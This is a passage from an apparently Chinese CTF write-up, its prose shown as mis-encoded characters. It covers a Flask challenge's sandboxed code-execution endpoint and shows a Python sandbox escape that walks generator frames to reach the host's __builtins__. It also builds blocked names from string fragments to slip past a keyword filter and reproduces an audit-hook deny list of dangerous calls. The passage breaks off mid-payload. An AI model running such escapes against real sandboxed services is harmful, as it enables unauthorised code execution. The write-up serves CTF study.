class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    file_path = os.path.abspath(filename)</span><br><span class="line">    project_root = os.path.abspath(os.getcwd())</span><br><span class="line">    blog_dir = os.path.abspath(<span class="string">&#x27;blog&#x27;</span>)</span><br><span class="line">    allowed_dirs = [project_root, blog_dir]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(file_path.startswith(allowed + os.sep) <span class="keyword">or</span> file_path == allowed <span class="keyword">for</span> allowed <span class="keyword">in</span> allowed_dirs):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    basename = os.path.basename(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (basename == <span class="string">&#x27;app.py&#x27;</span> <span class="keyword">or</span> basename.endswith(<span class="string">&#x27;.html&#x27;</span>)):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/oj&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oj</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        code = data.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;ä»£ç ä¸èƒ½ä¸ºç©º&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            source_simple_check(code)</span><br><span class="line">            compiled_code = <span class="built_in">compile</span>(code, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">            source_opcode_checker(compiled_code)</span><br><span class="line">            safe_builtins = &#123;</span><br><span class="line">                <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">                <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">                <span class="string">&quot;str&quot;</span>: <span class="built_in">str</span>,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>: <span class="built_in">int</span>,</span><br><span class="line">                <span class="string">&quot;float&quot;</span>: <span class="built_in">float</span>,</span><br><span class="line">                <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">                <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">                <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">                <span class="string">&quot;range&quot;</span>:<span class="built_in">range</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            sys.addaudithook(temp_audit_hook)</span><br><span class="line">            stdout = StringIO()</span><br><span class="line">            <span class="keyword">with</span> redirect_stdout(stdout):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;CTF_SANDBOX&quot;</span> + <span class="built_in">str</span>(<span class="built_in">id</span>(code)))</span><br><span class="line">                    <span class="built_in">exec</span>(compiled_code, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;, &#123;&#125;)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(sys, <span class="string">&#x27;audithooks&#x27;</span>):</span><br><span class="line">                        sys.audithooks.clear()</span><br><span class="line"></span><br><span class="line">            output = stdout.getvalue()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;output&quot;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> SandboxSecurityException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;å®‰å…¨æ‹¦æˆª: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;æ‰§è¡Œé”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_page</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;reset.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step1&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step1</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    email = data.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    user = users.get(username)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&#x27;email&#x27;</span>] == email:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;é‚®ç®±éªŒè¯æˆåŠŸ&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ç”¨æˆ·åæˆ–é‚®ç®±ä¸åŒ¹é…&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step2&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step2</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    id_card = data.get(<span class="string">&#x27;id_card&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    phone = data.get(<span class="string">&#x27;phone&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    user = users.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æ— æ•ˆç”¨æˆ·&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">            is_valid_id_card(id_card) <span class="keyword">and</span></span><br><span class="line">            is_valid_phone(phone) <span class="keyword">and</span></span><br><span class="line">            user[<span class="string">&#x27;id_card&#x27;</span>] == id_card <span class="keyword">and</span></span><br><span class="line">            user[<span class="string">&#x27;phone&#x27;</span>] == phone</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;èº«ä»½ä¿¡æ¯éªŒè¯æˆåŠŸ&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;èº«ä»½è¯å·æˆ–æ‰‹æœºå·é”™è¯¯&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step3&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step3</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    new_password = data.get(<span class="string">&#x27;new_password&#x27;</span>)</span><br><span class="line">    confirm_password = data.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> new_password != confirm_password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;</span>&#125;)</span><br><span class="line">    users[username][<span class="string">&#x27;password_md5&#x27;</span>] = hashlib.md5(new_password.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;å¯†ç é‡ç½®æˆåŠŸï¼&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™æ˜¯ä¸€ä¸ªæ²™ç®±ï¼Œå¯ä»¥æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯ï¼Œå­˜åœ¨ä¸‰é‡æ£€éªŒï¼Œä¸€ä¸ªæ˜¯æºç å±‚é¢çš„æ£€éªŒ <code>source_simple_check</code> ï¼Œéœ€è¦ä»£ç é‡Œä¸å­˜åœ¨è¿™äº›é»‘åå•å…³é”®è¯ï¼Œç¬¬äºŒå±‚æ˜¯å­—èŠ‚ç æ£€éªŒï¼Œç¬¬ä¸‰å±‚æ˜¯è¿è¡Œæ—¶æ£€éªŒï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ <code>addaudithook</code> ï¼Œä¸»è¦éœ€è¦ç»•è¿‡çš„æ˜¯ç¬¬ä¸€å±‚å’Œç¬¬ä¸‰å±‚ï¼Œå¯ä»¥å…ˆä»æ²™ç®±å…¥æ‰‹ï¼Œæƒ³åŠæ³•ç»•è¿‡æ²™ç®±ï¼Œä¸è¿‡ï¼Œæ²™ç®±ä¸­çš„ <code>&quot;__builtins__&quot;: safe_builtins</code> ï¼Œå¯çŸ¥å†…å»ºå‡½æ•°ä¸­æ²¡æœ‰å¯ä»¥è®©æˆ‘ä»¬å¯¼å…¥çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆå¯ä»¥æƒ³åŠæ³•é€ƒé€¸å‡ºæ²™ç®±ï¼Œåˆ°æ›´å¤–å±‚å¯èƒ½ä¼šæœ‰å¯ä»¥ä½¿ç”¨çš„ç‚¹ï¼Œæ‰€ä»¥ç”¨æ ˆå¸§é€ƒé€¸é€ƒåˆ°å¤–ç•Œå³å¯ã€‚</p><p>â€‹é¦–å…ˆæ˜¯æƒ³åŠæ³•é€ƒé€¸åˆ°å¤–ç•Œï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œå¤–ç•Œçš„ç¨‹åºé‡Œè‚¯å®šæ˜¯æœ‰ <code>&quot;__builtins__&quot;</code>  çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f7cb887bbd0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;/app/app.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;Flask&#x27;: &lt;class &#x27;flask.app.Flask&#x27;&gt;, &#x27;request&#x27;: &lt;Request &#x27;http://47.92.129.245:5000/admin/oj&#x27; [POST]&gt;, &#x27;jsonify&#x27;: &lt;function jsonify at 0x7f7cb7976a20&gt;, &#x27;render_template&#x27;: &lt;function render_template at 0x7f7cb769c680&gt;, &#x27;session&#x27;: &lt;Secuã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹å¯è§ï¼Œè¿™é‡Œå­˜åœ¨ <code>&quot;__builtins__&quot;</code> ï¼Œå¯æƒœæ˜¯ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆï¼Œçœ‹çœ‹è¿™ä¸€å±‚æ˜¯å“ªä¸€å±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b) </span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;frame at 0x7f7cb76e3de0, file &#x27;/app/app.py&#x27;, line 263, code oj&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å…ˆæ¥åšä¸ª test æ–‡ä»¶æµ‹è¯•ä¸‹ï¼Œå°†è¿™ä¸¤ä¸ªæ²™ç®±å‡½æ•°ç¨å¾®æ”¹æ”¹ï¼Œæœ¬åœ°è°ƒè¯•ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code_obj</span>):</span><br><span class="line">    opcode_io = StringIO()</span><br><span class="line">    dis(code_obj, file=opcode_io)</span><br><span class="line">    opcodes = opcode_io.getvalue().splitlines()</span><br><span class="line">    opcode_io.close()</span><br><span class="line"></span><br><span class="line">    allowed_globals = &#123;<span class="string">&quot;print&quot;</span>, <span class="string">&quot;len&quot;</span>, <span class="string">&quot;str&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;float&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;seed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LOAD_GLOBAL&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;IMPORT_NAME&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Import statements are not allowed&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;LOAD_METHOD&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    dangerous_events = &#123;</span><br><span class="line">        <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;os.popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.call&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.check_output&quot;</span>, <span class="string">&quot;subprocess.run&quot;</span>, <span class="string">&quot;subprocess.getoutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;builtins.eval&quot;</span>, <span class="string">&quot;builtins.compile&quot;</span>, <span class="string">&quot;builtins.__import__&quot;</span>, <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;importlib.import_module&quot;</span>,</span><br><span class="line">        <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os.open&quot;</span>, <span class="string">&quot;os.read&quot;</span>, <span class="string">&quot;os.write&quot;</span>,</span><br><span class="line">        <span class="string">&quot;urllib.request.urlopen&quot;</span>, <span class="string">&quot;urllib.request.Request&quot;</span>, <span class="string">&quot;requests.&quot;</span>, <span class="string">&quot;socket.socket&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http.client.HTTPConnection&quot;</span>, <span class="string">&quot;http.client.HTTPSConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctypes.&quot;</span>, <span class="string">&quot;marshal.loads&quot;</span>, <span class="string">&quot;os.execv&quot;</span>, <span class="string">&quot;os.execve&quot;</span>, <span class="string">&quot;os.execvp&quot;</span>, <span class="string">&quot;os.execvpe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.environ&quot;</span>, <span class="string">&quot;os.getenv&quot;</span>, <span class="string">&quot;os.getpid&quot;</span>, <span class="string">&quot;os.getuid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;os.system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.remove&quot;</span>, <span class="string">&quot;os.unlink&quot;</span>, <span class="string">&quot;os.chmod&quot;</span>, <span class="string">&quot;os.chown&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> dangerous_event <span class="keyword">in</span> dangerous_events:</span><br><span class="line">        <span class="keyword">if</span> event == dangerous_event <span class="keyword">or</span> event.startswith(dangerous_event + <span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥ç®€å•æ•´æ”¹ä¸‹æºç ä»»æœŸèƒ½å¤Ÿåœ¨æœ¬åœ°è¿è¡Œï¼Œä¹‹åå°±æ˜¯è°ƒè¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fcb0591f090&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;,ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œçš„ <code>&quot;__builtins__&quot;</code>  æ˜¯æ¨¡å—ï¼Œä½†æ˜¯å› ä¸ºç¬¬ä¸€å±‚ waf è¿‡æ»¤å¤ªå¤šå…³é”®å­—äº†ï¼Œæ‰€ä»¥æ ¹æ®æ¨¡å—çš„è°ƒç”¨æ–¹å¼è¿™ä¸ªä¼¼ä¹æ²¡æ³•è¿›è¡Œç»•è¿‡ï¼Œé‚£ä¹ˆå†å›æº¯ä¸€å±‚å†çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&#x27;__builtins__&#x27;: &#123;&#x27;__name__&#x27;: &#x27;builtins&#x27;, &#x27;__doc__&#x27;: &quot;Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all &#x27;built-in&#x27;\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThi ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå°±æˆäº†å­—å…¸ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œç»•è¿‡äº†ï¼Œè¿™é‡ŒæˆåŠŸè·å–äº† <code>&quot;__builtins__&quot;</code>  çš„å­—å…¸ï¼Œé‚£ä¹ˆåœ¨é¢˜ç›®é‡Œæµ‹è¯•ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span> <span class="keyword">in</span> b:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok</span></span><br></pre></td></tr></table></figure><p>â€‹è¯æ˜æ˜¯æˆåŠŸäº†ï¼Œä½†æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå¦‚æœç›´æ¥è¾“å‡º b ä¼šå¯¼è‡´ç¨‹åº crash æ‰ï¼Œå°½å¯èƒ½åˆ«è¾“å‡ºï¼Œè¿™ä¼¼ä¹æ˜¯åˆ«çš„ä»€ä¹ˆé—®é¢˜å¯¼è‡´çš„æŠ¥é”™ã€‚</p><p>â€‹æ—¢ç„¶æœ‰äº† <code>&quot;__builtins__&quot;</code>  ä¹‹åï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘ç›´æ¥æŠŠ <code>os._exit(0)</code>  ç»™æ¨æ‰ï¼Œè¿™æ ·å°±ç®—æ‰§è¡Œäº† <code>system</code>  ä¹‹ç±»çš„å‡½æ•°ä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œç›´æ¥æ‰”ä¸‹ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span 